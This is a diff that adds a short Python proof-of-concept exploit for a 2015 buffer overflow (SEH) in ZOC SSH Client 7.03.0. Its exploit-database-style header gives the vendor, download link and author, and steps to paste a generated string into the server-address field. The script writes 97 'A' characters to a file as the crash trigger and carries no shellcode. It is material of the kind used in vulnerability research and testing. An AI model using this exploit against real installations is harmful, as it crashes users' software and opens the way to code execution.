@@ -1,0 +1,19 @@
+"""
+# Exploit title: ZOC SSH Client v.7.03.0 Buffer overflow vulnerability (SEH)
+# Date: 20-5-2015
+# Vendor homepage: www.emtec.com
+# Software Link: http://www.emtec.com/cgi-local/download.cgi?what=ZOC7%20(Windows)&link=zoc/zoc7030.exe&ext=html
+# Author: Dolev Farhi
+
+# Details:
+# --------
+# Create a new connection, run the py script and copy the AAAA...string from zoc.txt to clipboard. paste it in the
+# server address and attempt to connect.
+"""
+
+#!/usr/bin/python
+filename="zoc.txt"
+buffer = "\x41" * 97
+textfile = open(filename , 'w')
+textfile.write(buffer)
+textfile.close()
